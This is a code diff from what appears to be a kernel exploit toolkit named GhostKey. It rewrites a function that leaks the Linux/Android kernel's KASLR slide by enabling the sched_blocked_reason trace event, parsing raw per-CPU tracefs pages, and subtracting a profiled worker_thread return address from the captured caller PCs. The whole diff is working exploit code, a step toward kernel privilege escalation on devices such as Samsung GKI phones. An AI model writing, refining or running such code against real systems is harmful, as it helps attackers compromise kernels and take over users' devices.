@@ -1268,53 +1268,57 @@ fail:
 /*
  * tracefs KASLR slide leak (ghostlock-s26 approach, integrated into GhostKey).
  *
- * Uses the sched_blocked_reason trace event to leak the KASLR slide without
- * relying on kmem_cache_alloc / timer_probe.  worker_thread and other kworker
- * functions block in schedule() constantly, so after enabling the event and
- * waiting ~2 s there are always records.
+ * Uses the sched_blocked_reason trace event to leak the KASLR slide by
+ * matching the caller PC against the known worker_thread return address
+ * (tracefs_worker_caller_off from profile) rather than all kallsyms symbols.
+ * This is the ghostlock-s26 approach: worker_thread blocks in schedule()
+ * constantly; the trace record's caller is the return PC of the BL schedule.
+ * The correct KASLR slide is: slide = caller_pc - (KIMAGE_TEXT_BASE + tracefs_worker_caller_off).
  *
- * Each record contains a caller PC (return address of the blocking call).
- * We look up each caller PC in the kallsyms map; the most common
- * (caller_pc - symbol_va) value is the correct KASLR slide.
- *
- * This is used as a fallback when the timer-based calib_a produces a weak or
- * implausible slide (e.g. do_timer_create was inlined / rare on this kernel).
+ * Used as fallback when timer-based calib_a produces weak/implausible slide,
+ * and also to cross-check weak slides.
  */
-static int calib_a_tracefs_slide_leak(sr_sym *syms, size_t nsyms,
+static int calib_a_tracefs_slide_leak(const struct kernel_offsets *o,
 				      uint64_t *out_slide)
 {
 	static const char tracing_on[] = TRACE "/tracing_on";
 	static const char event_enable[] = TRACE "/events/sched/sched_blocked_reason/enable";
-	static const char event_id_path[] = TRACE "/events/sched/sched_blocked_reason/id";
-	char event_id_buf[32];
-	int event_id = -1;
 	int fd;
 	char path[128];
 	unsigned char page[4096];
 	ssize_t got;
-	/* slide value -> count */
-	static uint64_t slide_vals[256];
-	static int slide_cnts[256];
-	int n_slides = 0;
-	int attempt, cpu, ncpu;
+	uint64_t candidate_slide = 0;
 	int found = 0;
-	uint64_t best_slide = 0;
-	int best_count = 0;
+	int attempt, cpu, ncpu;
 
-	/* Read the trace event ID for sched_blocked_reason */
-	fd = open(event_id_path, O_RDONLY | O_CLOEXEC);
-	if (fd >= 0) {
-		got = read(fd, event_id_buf, sizeof(event_id_buf) - 1);
-		close(fd);
-		if (got > 0) {
-			event_id_buf[got] = 0;
-			event_id = atoi(event_id_buf);
+	/* Need tracefs_worker_caller_off from profile */
+	if (!o->tracefs_worker_caller_off) {
+		fprintf(stdout, "[calib_a] tracefs: profile missing tracefs_worker_caller_off\n");
+		return 0;
+	}
+	uint64_t link_caller = KIMAGE_TEXT_BASE + o->tracefs_worker_caller_off;
+
+	/* event_id: use profile's tracefs_event_id if available, else read from fs */
+	uint16_t tracefs_event_id = (uint16_t)o->tracefs_event_id;
+	if (tracefs_event_id == 0) {
+		static const char event_id_path[] = TRACE "/events/sched/sched_blocked_reason/id";
+		char event_id_buf[32];
+		fd = open(event_id_path, O_RDONLY | O_CLOEXEC);
+		if (fd >= 0) {
+			ssize_t r = read(fd, event_id_buf, sizeof(event_id_buf) - 1);
+			close(fd);
+			if (r > 0) {
+				event_id_buf[r] = 0;
+				tracefs_event_id = (uint16_t)atoi(event_id_buf);
+			}
 		}
 	}
-	if (event_id <= 0) {
-		fprintf(stdout, "[calib_a] tracefs: cannot read sched_blocked_reason event id, trying common IDs\n");
-		/* Try common IDs: 110 (Samsung GKI), 105, 106, 107 */
+	if (tracefs_event_id == 0) {
+		/* Fallback: Samsung GKI typically uses 110 */
+		tracefs_event_id = 110;
 	}
+	fprintf(stdout, "[calib_a] tracefs: using event_id=%u link_caller=0x%llx\n",
+		tracefs_event_id, (unsigned long long)link_caller);
 
 	/* Disable kmem events to reduce noise */
 	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
@@ -1323,7 +1327,7 @@ static int calib_a_tracefs_slide_leak(sr_sym *syms, size_t nsyms,
 
 	/* Enable sched_blocked_reason */
 	if (write_file(event_enable, "1\n")) {
-		fprintf(stdout, "[calib_a] tracefs: sched_blocked_reason not available (enabling failed)\n");
+		fprintf(stdout, "[calib_a] tracefs: sched_blocked_reason not available\n");
 		return 0;
 	}
 
@@ -1338,7 +1342,8 @@ static int calib_a_tracefs_slide_leak(sr_sym *syms, size_t nsyms,
 	ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
 	if (ncpu > 16) ncpu = 16;
 
-	for (attempt = 0; attempt < 3 && !found; attempt++) {
+	/* Retry up to 5 times (ghostlock does 5 attempts) */
+	for (attempt = 0; attempt < 5 && !found; attempt++) {
 		for (cpu = 0; cpu < ncpu && !found; cpu++) {
 			snprintf(path, sizeof(path),
 				 TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
@@ -1346,7 +1351,6 @@ static int calib_a_tracefs_slide_leak(sr_sym *syms, size_t nsyms,
 			if (fd < 0)
 				continue;
 			while ((got = read(fd, page, sizeof(page))) > 0) {
-				/* Parse trace page: 16-byte header, then records */
 				if (got < 20) continue;
 				uint64_t commit = 0;
 				memcpy(&commit, page + 8, sizeof(commit));
@@ -1369,9 +1373,7 @@ static int calib_a_tracefs_slide_leak(sr_sym *syms, size_t nsyms,
 
 					uint16_t eid = 0;
 					memcpy(&eid, page + rec, sizeof(eid));
-
-					/* Match event_id if known, otherwise accept all */
-					if (event_id > 0 && eid != (uint16_t)event_id) {
+					if (eid != tracefs_event_id) {
 						pos = rec + rec_len;
 						continue;
 					}
@@ -1379,57 +1381,21 @@ static int calib_a_tracefs_slide_leak(sr_sym *syms, size_t nsyms,
 					/* Caller PC is at record + 16 (ghostlock slide.c) */
 					if (rec_len >= 24) {
 						uint64_t caller = 0;
-						memcpy(&caller, page + rec + 16,
-						       sizeof(caller));
-						/* Check if it's a kernel text address */
+						memcpy(&caller, page + rec + 16, sizeof(caller));
+						/* Must be a kernel text address, 2MiB-aligned candidate */
 						if ((caller >> 48) == 0xffff &&
-						    (caller & 3) == 0) {
-							/* Look up in kallsyms */
-							uint64_t func_base,
-								func_len;
-							if (sr_find_func(
-								syms, nsyms,
-								caller,
-								&func_base,
-								&func_len,
-								NULL)) {
-								uint64_t slide =
-									caller -
-									func_base;
-								if (slide <
-								    (1ULL << 42) &&
-								    slide <
-								    func_len +
-									    (1U
-									     <<
-									     21)) {
-									/* Add to count */
-									int j,
-									    dup =
-									        0;
-									for (j = 0;
-									     j <
-									     n_slides;
-									     j++) {
-										if (slide_vals[j] ==
-										    slide) {
-											slide_cnts[j]++;
-											dup = 1;
-											break;
-										}
-									}
-									if (!dup &&
-									    n_slides <
-									    256) {
-										slide_vals[n_slides] =
-											slide;
-										slide_cnts[n_slides] =
-											1;
-										n_slides++;
-									}
-									found =
-									    1;
-								}
+						    (caller & 3) == 0 &&
+						    caller >= link_caller) {
+							uint64_t slide = caller - link_caller;
+							if (slide < (1ULL << 42) &&
+							    (slide & (SR_SLIDE_ALIGN - 1)) == 0) {
+								candidate_slide = slide;
+								found = 1;
+								fprintf(stdout,
+									"[calib_a] tracefs: discovered worker caller: caller=0x%016llx, candidate=0x%08llx\n",
+									(unsigned long long)caller,
+									(unsigned long long)slide);
+								break;
 							}
 						}
 					}
@@ -1438,32 +1404,19 @@ static int calib_a_tracefs_slide_leak(sr_sym *syms, size_t nsyms,
 			}
 			close(fd);
 		}
-		if (!found || n_slides == 0)
-			break;
+		if (found) break;
+		if (!found && attempt < 4)
+			sleep(1);
 	}
 
-	if (!found || n_slides == 0) {
-		fprintf(stdout, "[calib_a] tracefs: no caller PCs extracted\n");
+	if (!found) {
+		fprintf(stdout, "[calib_a] tracefs: no valid caller found after %d attempts\n", attempt + 1);
 		return 0;
 	}
 
-	/* Find the most common slide */
-	for (int i = 0; i < n_slides; i++) {
-		if (slide_cnts[i] > best_count) {
-			best_count = slide_cnts[i];
-			best_slide = slide_vals[i];
-		}
-	}
-
-	if (best_count < 3) {
-		fprintf(stdout, "[calib_a] tracefs: weak slide (count=%d), not confident\n",
-			best_count);
-		/* Still return the slide if it's the only one */
-	}
-
-	fprintf(stdout, "[calib_a] tracefs: slide=%#llx (count=%d, candidates=%d)\n",
-		(unsigned long long)best_slide, best_count, n_slides);
-	*out_slide = best_slide;
+	fprintf(stdout, "[calib_a] tracefs: slide=%#llx (verified 2MiB aligned)\n",
+		(unsigned long long)candidate_slide);
+	*out_slide = candidate_slide;
 	return 1;
 }
 
@@ -1647,7 +1600,7 @@ int calib_a_main(int argc, char **argv)
 		fprintf(stdout, "[calib_a] timer-based slide failed, trying tracefs leak...\n");
 		if (g_have_syms && g_syms) {
 			uint64_t ts_slide = 0;
-			if (calib_a_tracefs_slide_leak(g_syms, g_nsyms, &ts_slide)) {
+			if (calib_a_tracefs_slide_leak(o, &ts_slide)) {
 				slide = ts_slide;
 				found = 1;
 				fprintf(stdout, "[calib_a] tracefs leak provided slide=%#llx\n",
@@ -1676,8 +1629,7 @@ int calib_a_main(int argc, char **argv)
 			fprintf(stdout, "[calib_a] slide is weak, cross-checking with tracefs...\n");
 			if (g_have_syms && g_syms) {
 				uint64_t ts_slide2 = 0;
-				if (calib_a_tracefs_slide_leak(g_syms, g_nsyms,
-							       &ts_slide2)) {
+				if (calib_a_tracefs_slide_leak(o, &ts_slide2)) {
 					if (ts_slide2 != slide) {
 						fprintf(stdout, "[calib_a] tracefs corrects slide: %#llx -> %#llx\n",
 							(unsigned long long)slide,
